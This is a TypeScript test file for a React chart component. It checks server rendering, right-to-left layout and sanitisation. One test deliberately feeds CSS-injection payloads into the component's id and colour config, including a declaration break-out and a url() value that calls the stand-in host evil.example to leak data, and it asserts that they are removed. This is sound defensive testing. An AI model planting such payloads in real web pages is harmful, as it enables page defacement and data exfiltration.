import { describe, expect, test } from 'bun:test'
import * as React from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { Bar, BarChart, XAxis } from 'recharts'
import { DirectionProvider } from '../../direction'
import { ChartContainer } from '../chart'

const data = [{ name: 'alpha', value: 12 }]

describe('registry-ui chart', () => {
  test('ChartContainer server render does not emit invalid size warnings', () => {
    const originalWarn = console.warn
    const warnings: string[] = []

    console.warn = (...args: unknown[]) => {
      warnings.push(args.map((value) => String(value)).join(' '))
    }

    try {
      const html = renderToStaticMarkup(
        <ChartContainer
          config={{
            value: {
              color: 'hsl(var(--chart-1))',
              label: 'Value',
            },
          }}>
          <BarChart accessibilityLayer data={data}>
            <XAxis dataKey="name" hide />
            <Bar dataKey="value" fill="var(--color-value)" radius={8} />
          </BarChart>
        </ChartContainer>,
      )

      expect(html).toContain('data-slot="chart-container"')
      expect(warnings.some((message) => message.includes('The width(') && message.includes('height('))).toBe(false)
    } finally {
      console.warn = originalWarn
    }
  })

  test('ChartStyle neutralises CSS-injection payloads in config and id (SEC-001/SEC-003)', () => {
    const html = renderToStaticMarkup(
      <ChartContainer
        // biome-ignore lint/suspicious/noExplicitAny: adversarial id override for the test
        id={'x] body {display:none} [data-chart=y' as any}
        config={
          {
            // unsafe key — must be dropped
            'foo}': { color: 'red' },
            // unsafe color — declaration break-out — must be dropped
            evil: { color: 'red;}body{display:none' },
            // unsafe color — url() exfiltration — must be dropped
            leak: { color: 'url(//evil.example/?leak)' },
            // safe entry — must survive
            value: { color: '#aabbcc' },
            // biome-ignore lint/suspicious/noExplicitAny: adversarial config shape for the test
          } as any
        }>
        <BarChart accessibilityLayer data={data}>
          <XAxis dataKey="name" hide />
          <Bar dataKey="value" fill="var(--color-value)" radius={8} />
        </BarChart>
      </ChartContainer>,
    )

    // None of the injection payloads survive into the rendered <style> text.
    expect(html).not.toContain('body{display:none')
    expect(html).not.toContain('body {display:none}')
    expect(html).not.toContain('url(//evil.example')
    expect(html).not.toContain('--color-foo}')
    expect(html).not.toContain('[data-chart=x]')
    // The safe entry is still emitted.
    expect(html).toContain('--color-value: #aabbcc;')
  })

  test('ChartContainer follows the surrounding direction and keeps SVG labels anchored in RTL', () => {
    const html = renderToStaticMarkup(
      <DirectionProvider dir="rtl">
        <ChartContainer config={{ value: { color: 'hsl(var(--chart-1))', label: 'Value' } }}>
          <BarChart data={data}>
            <Bar dataKey="value" />
          </BarChart>
        </ChartContainer>
      </DirectionProvider>,
    )

    expect(html).toContain('dir="rtl"')
    expect(html).toContain('rtl:[&amp;_text[text-anchor=end]]:[text-anchor:start]')
  })
})
